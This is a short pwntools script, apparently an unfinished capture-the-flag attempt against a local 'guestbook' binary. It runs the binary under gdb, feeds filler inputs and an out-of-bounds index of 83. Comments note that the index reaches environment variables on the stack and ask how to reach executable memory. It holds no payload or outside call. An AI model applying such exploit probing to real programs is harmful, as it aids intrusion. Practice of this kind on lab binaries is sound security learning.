from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./guestbook")
#libc = ELF("libc6_2.27-3ubuntu1_i386.so")
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-guestbook.so.6")}


#p = process('./guestbook', 'break *main')
p = gdb.debug('./guestbook', '''
break *main
break *main+443''')

p.recv()
p.sendline("AAAA")

p.recv()
p.sendline("BBBB")

p.recv()
p.sendline("CCCC")

p.recv()
p.sendline("DDDD")

p.recv()
p.sendline("1")

# SHELL2=BBBB
# gef  x/12s 0xff900be1
# 0xff900be1:     "EEEE"

# 83 because it lands on enviornment vairables section on stack.
# stack is rw- so cannot execute.
# Can we write to other places?
# can i jump to -rx memory?

p.recv()
p.sendline("83")

p.interactive()





